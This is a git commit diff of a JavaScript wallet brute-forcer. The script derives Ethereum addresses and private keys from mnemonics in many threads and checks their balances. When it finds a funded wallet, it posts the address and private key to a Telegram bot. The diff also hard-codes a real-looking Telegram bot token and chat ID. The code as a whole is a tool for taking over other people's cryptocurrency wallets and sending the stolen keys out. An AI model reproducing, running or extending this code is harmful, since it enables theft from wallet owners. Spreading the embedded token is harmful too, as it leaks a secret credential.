4ee380eabab9f32551c94c8e8ff17d9bb664f922
Hlebaster <143820124+Hlebaster@users.noreply.github.com>
2024-04-16 17:51:30 +0300

    Update index.js

--- index.js
+++ index.js
@@ -2,25 +2,28 @@ const { ethers } = require('ethers');
 const axios = require('axios');
 const cheerio = require('cheerio')
 const { Worker, isMainThread, workerData } = require('worker_threads');
+const { Web3 } = require('Web3');
 
-const TELEGRAM_BOT_TOKEN = "TELEGRAM_BOT_TOKEN";
-const TELEGRAM_CHAT_ID = "TELEGRAM_CHAT_ID";
-const THREAD_COUNT = 100;
+const web3 = new Web3('https://ethereum-rpc.publicnode.com');
+
+
+const TELEGRAM_BOT_TOKEN = "6601744224:AAH9El9DnjcUf9zIhqr99jOEHvlxgaD0nJE";
+const TELEGRAM_CHAT_ID = "5581608237";
+const THREAD_COUNT = 70;
 const ADDRESS_COUNT = 1000000000000000;
 
 async function fetchBalance(addr) {
   try {
-    const url = `https://ethereum.atomicwallet.io/address/${addr}`;
-    const response = await axios.get(url);
-    const $ = cheerio.load(response.data);
-
-    const balanceStr = $('main div table tbody tr:nth-child(2) td:nth-child(2) span span:nth-child(1)').text().split(' ')[0].replace(',', '');
-    return parseFloat(balanceStr);
+    var balance = await web3.eth.getBalance(addr);
+    balance = web3.utils.fromWei(balance, "ether");
+    return balance;
   } catch (error) {
     console.error(error.toString());
     return null;
   }
 }
+
+
 
 async function sendTelegramMessage(botToken, chatId, message) {
   const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -43,21 +46,21 @@ async function processAddress(startIndex, mnemonic, passphrase) {
       const addrBalance = await fetchBalance(address);
 
       console.log(
-        `(${index}) Address: ${address} Private Key: 0x${privateKey} Balance: ${addrBalance}`
+        `(${index}) Address: ${address} Private Key: ${privateKey} Balance: ${addrBalance}`
       );
 
-      if (addrBalance !== null && addrBalance !== 0) {
+      if (addrBalance !== null && addrBalance > 0) {
         const currentTime = new Date().toLocaleString();
         const formattedAmount = new Intl.NumberFormat().format(index + 1);
-        const message = `Дядя есть #деньгиии!!!!\nВремя: ${currentTime}\nВсего сгенерировано адресов: ${formattedAmount}\n\nAddress: ${address}\nPrivate Key: 0x${privateKey}\nBalance: ${addrBalance}\n`;
+        const message = `Дядя @lurkees есть #деньгиии!!!!\nВремя: ${currentTime}\nВсего сгенерировано адресов: ${formattedAmount}\n\nAddress: ${address}\nPrivate Key: ${privateKey}\nBalance: ${addrBalance}\n`;
 
         await sendTelegramMessage(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);
 
-        const outputData = `(${index}) Address: ${address} Private Key: 0x${privateKey} Balance: ${addrBalance}\n`;
+        const outputData = `(${index}) Address: ${address} Private Key: ${privateKey} Balance: ${addrBalance}\n`;
         // Add output data to a file or other places as needed
       }
 
-      if ((index + 1) % 1000 === 0) {
+      if ((index + 1) % 100000 === 0) {
         const currentTime = new Date().toLocaleString();
         const formattedAmount = new Intl.NumberFormat().format(index + 1);
         const message = `Достигнут новый этап!\nВремя: ${currentTime}\nВсего сгенерировано адресов: ${formattedAmount}`;
